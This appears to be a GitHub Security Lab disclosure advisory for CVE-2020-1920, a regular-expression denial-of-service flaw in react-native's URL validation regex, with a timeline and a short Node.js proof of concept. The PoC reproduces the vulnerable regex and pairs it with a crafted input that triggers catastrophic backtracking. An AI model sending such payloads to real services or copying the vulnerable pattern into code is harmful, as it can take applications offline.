<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">June 4, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-293: Regular expression Denial of Service in react-native - CVE-2020-1920</h1>
...
<ul>
  <li>2020-11-29: Report sent to facebook.com/whitehat</li>
  <li>2020-12-11: CVE-2020-1920 is assigned</li>
  <li>2021-06-02: Fix is <a href="https://github.com/facebook/react-native/releases/tag/v0.64.1">released</a></li>
</ul>
...
<p><code class="language-plaintext highlighter-rouge">react-native</code> uses a regex based on <a href="https://gist.github.com/dperini/729294">a gist</a> to validate URLs. The vulnerable code does not seem to be directly used by the framework itself, however it seems clients are intended to use it.</p>

<p>We haven’t tried the exploit in action, but it seems like all that is needed is to construct an instance of <code class="language-plaintext highlighter-rouge">URL</code> with a malicious payload.</p>

<p>This vulnerability was found using a <a href="https://securitylab.github.com/tools/codeql/">CodeQL</a> query which identified the <code class="language-plaintext highlighter-rouge">validateBaseUrl</code> regex as vulnerable.
<a href="https://lgtm.com/query/3565761733228581901/">Link to query run</a></p>

<h3 id="poc">PoC</h3>

<p>Reproducer where we’ve copied the relevant code:</p>

<ul>
  <li>Put the below in a <code class="language-plaintext highlighter-rouge">.js</code> file an run with node:</li>
</ul>

<pre><code class="language-JavaScript">function validateBaseUrl(url) {
  // from this MIT-licensed gist: https://gist.github.com/dperini/729294
  return /^(?:(?:(?:https?|ftp):)?\/\/)(?:(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,}))?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(
    url,
  );
}
validateBaseUrl("http://foobar.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.")
</code></pre>
...
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-293</code> in any communication regarding this issue.</p>
